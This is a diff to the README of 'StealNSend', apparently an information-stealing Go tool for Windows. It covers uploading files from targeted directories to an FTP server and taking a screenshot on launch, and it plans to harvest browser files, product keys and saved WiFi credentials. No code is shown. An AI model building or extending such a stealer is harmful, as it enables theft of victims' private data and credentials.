@@ -10,8 +10,9 @@ This program allows you to identify and upload files from specific directories a
 
 ### Key Features
 - **Recursive Directory Scanning** - Identifies and collects all files within specified directories while ignoring subdirectories
+- **Screenshot** - Takes a screenshot the moment the program is started
 - **FTP Server Connection** - Manages connection to a remote FTP server with configurable credentials (host, port, username, password)
-- **Modular Organization** - The code is structured into separate files for better readability and maintainability: `main.go`: Coordinates the overall workflow. `utility.go`: Defines target directories, handles FTP connection and file uploads
+- **Modular Organization** - The code is structured into separate files for better readability and maintainability: `main.go`: Coordinates the overall workflow. `utility.go`: Defines target directories, handles FTP connection, file uploads and other.
 
 ## Requirements
 - **Go** - Version 1.18+
@@ -36,6 +37,11 @@ go mod init <PROJECT_NAME>
 go mod tidy
 ```
 - **Build the Program** - `GOOS=windows GOARCH=amd64 go build -o <OUTPUT_NAME>.exe main.go utility.go`
+
+## Future improvements
+- Upload files to their respective folders (i.e. Chrome files are uploaded to the Chrome folder)
+- Get hardware info and network info (CPU, GPU, MAC, IP, ProductKey, saved WiFi connections...)
+- Use a more secure way to upload data
 
 ## Disclaimer
 This program is intended strictly for educational and research purposes. Any use of StealNSend for unauthorized access, malicious activities, or data theft is strictly prohibited. The author assumes **no** responsability for misuse of this program.
